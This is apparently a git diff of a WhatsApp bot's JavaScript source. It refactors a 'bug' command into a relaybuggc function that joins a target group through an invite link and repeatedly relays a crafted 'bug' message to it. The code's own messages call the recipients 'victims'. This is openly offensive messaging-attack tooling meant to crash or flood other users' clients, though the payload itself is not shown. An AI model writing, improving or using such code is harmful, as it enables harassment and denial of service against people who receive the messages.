@@ -96,6 +96,21 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug){
     repondre(`Successfully sent ${amount} bugs to ${victims.join(', ')}.`);
   }
 
+async function relaybuggc(dest, zk, ms, repondre, amount, gc, bug){
+    //send bug
+    for (let i = 0; i < amount; i++){
+      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject(bug), { userJid: dest, quoted : ms});
+        try {
+            zk.relayMessage(gc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
+        } catch (e) {
+            repondre(`An error occured while sending bugs to ${'https://chat.whatsapp.com' + link}`);
+            console.log(`An error occured while sending bugs to ${link}: ${e}`);
+            break;
+        }
+        await delay(3000);
+    }
+}
+
 // --cmds--
 
 // bug menu
@@ -796,9 +811,13 @@ zokou(
         link = arg[0].split('https://chat.whatsapp.com/')[1];
         try {
           gc = zk.groupAcceptInvite(link);
+          await repondre(`sending ${amount} bugs to ${ 'https://chat.whatsapp.com/' + link }`);
+          await relaybuggc(dest, zk, ms, repondre, amount, gc, bug);
         } catch(e) {
-          return await repondre(`something went wrong`)
-          console.log(`something went wrong : ${e}`)
+          await repondre(`something went wrong`);
+          console.log(`something went wrong : ${e}`);
+          await react(dest, zk, ms, '⚠️');
+          return;
         }
       } else {
         return await repondre(`${link} is not a valid group link`);
@@ -812,26 +831,18 @@ zokou(
         link = arg.join('').split('|')[1].split('https://chat.whatsapp.com/')[1];
         try {
           gc = zk.groupAcceptInvite(link);
+          await repondre(`sending ${amount} bugs to ${ 'https://chat.whatsapp.com/' + link }`);
+          await relaybuggc(dest, zk, ms, repondre, amount, gc, bug);
         } catch(e) {
-          return await repondre(`something went wrong`)
+          await react(dest, zk, ms, '⚠️');
+          await repondre(`something went wrong`);
           console.log(`something went wrong : ${e}`)
+          return;
         }
         } else {
           return await repondre(`${link} is not a valid group link`);
         }
       }
-    }
-    //send bug
-    for (let i = 0; i < amount; i++){
-      var scheduledCallCreationMessage = generateWAMessageFromContent(dest, proto.Message.fromObject(bug), { userJid: dest, quoted : ms});
-        try {
-            zk.relayMessage(gc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id });
-        } catch (e) {
-            repondre(`An error occured while sending bugs to ${'https://chat.whatsapp.com' + link}`);
-            console.log(`An error occured while sending bugs to ${link}: ${e}`);
-            break;
-        }
-        await delay(3000);
     }
   }
 );
